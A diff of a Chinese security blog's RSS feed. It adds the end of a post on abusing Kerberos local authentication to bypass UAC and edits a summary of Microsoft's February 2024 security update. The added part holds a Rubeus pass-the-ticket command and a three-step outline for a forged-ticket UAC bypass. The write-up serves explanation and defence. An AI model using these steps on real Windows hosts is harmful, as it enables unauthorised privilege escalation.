+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Rubeus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ptt&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ticket&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BASE64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TICKET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;方法二票据伪造攻击&#34;&gt;方法二：票据伪造攻击
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;利用Benjamin Delpy在kekeo中发现的非约束委派漏洞获取本地TGT&lt;/li&gt;
+&lt;li&gt;向KDC请求新的本地服务票据，填充伪造的MachineID&lt;/li&gt;
+&lt;li&gt;将伪造票据导入缓存实现UAC绕过&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;kerb-local的奥秘&#34;&gt;KERB-LOCAL的奥秘
+&lt;/h2&gt;&lt;p&gt;这个字段设计用于凭证重用，但实际使用频率很低，因为：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;仅当服务端使用Negotiate包时有效&lt;/li&gt;
+&lt;li&gt;本地Negotiate认证默认会选择NTLM协议&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;有趣的是，KERB-LOCAL中的值实际是LSASS堆中KERB_CREDENTIAL结构的地址和票据计数。虽然Kerberos会验证PAC中的SID匹配性，但这种实现方式可能存在安全隐患。&lt;/p&gt;
+&lt;p&gt;[更新] 文末提供了修改Win32 SCM API以强制使用Kerberos本地认证的C++代码示例。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>微软2024年2月安全更新：修复多款产品高危漏洞</title>
         <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF2024%E5%B9%B42%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E4%BF%AE%E5%A4%8D%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E/</link>
-        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+        <pubDate>Fri, 01 Aug 2025 23:01:47 +0800</pubDate>
         
         <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF2024%E5%B9%B42%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E4%BF%AE%E5%A4%8D%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E/</guid>
-        <description>&lt;img src="https://www.microsoft.com/favicon.ico" alt="Featured image of post 微软2024年2月安全更新：修复多款产品高危漏洞" /&gt;&lt;p&gt;2024年2月13日（美国时间），微软发布了针对其产品安全漏洞的月度更新。本次更新涉及Windows、Exchange Server、Office等多款产品，共修复73个漏洞，其中5个漏洞在更新发布前已被公开利用，3个漏洞CVSS评分高达9.8分。&lt;/p&gt;
+        <description>&lt;p&gt;2024年2月13日（美国时间），微软发布了针对其产品安全漏洞的月度更新。本次更新涉及Windows、Exchange Server、Office等多款产品，共修复73个漏洞，其中5个漏洞在更新发布前已被公开利用，3个漏洞CVSS评分高达9.8分。&lt;/p&gt;
 &lt;h3 id=&#34;关键漏洞警示&#34;&gt;关键漏洞警示
 &lt;/h3&gt;&lt;p&gt;以下漏洞需优先处理：&lt;/p&gt;
 &lt;ul&gt;
@@ -27,9 +236,12 @@
 &lt;/ul&gt;
 &lt;h3 id=&#34;重要更新说明&#34;&gt;重要更新说明
 &lt;/h3&gt;&lt;ol&gt;
-&lt;li&gt;&lt;strong&gt;Exchange Server&lt;/strong&gt;：安装CU14后默认启用扩展保护功能&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Windows Server&lt;/strong&gt;：证书映射策略变更，采用更严格的X509IssuerSerialNumber验证&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;安全启动&lt;/strong&gt;：新增UEFI CA信任锚点，4月开始分阶段部署&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Exchange Server&lt;/strong&gt;：安装CU14后默认启用扩展保护功能&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;安全启动&lt;/strong&gt;：新增UEFI CA信任锚点，4月开始分阶段部署&lt;/p&gt;
+&lt;/li&gt;
 &lt;/ol&gt;
 &lt;h3 id=&#34;受影响产品清单&#34;&gt;受影响产品清单
 &lt;/h3&gt;&lt;table&gt;
@@ -74,8 +286,6 @@
 &lt;/ol&gt;
 &lt;p&gt;下次安全更新计划于2024年3月12日发布。建议通过&lt;a class=&#34;link&#34; href=&#34;https://github.com/microsoft/MSRC-Security-Update-API&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;安全更新指南API&lt;/a&gt;建立定制化监控方案。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;注：本文档于2024年2月15日更新Exchange Server CU14相关信息，2月16日补充安全启动密钥更新细节。&lt;/p&gt;&lt;/blockquote&gt;
 </description>
         </item>
         
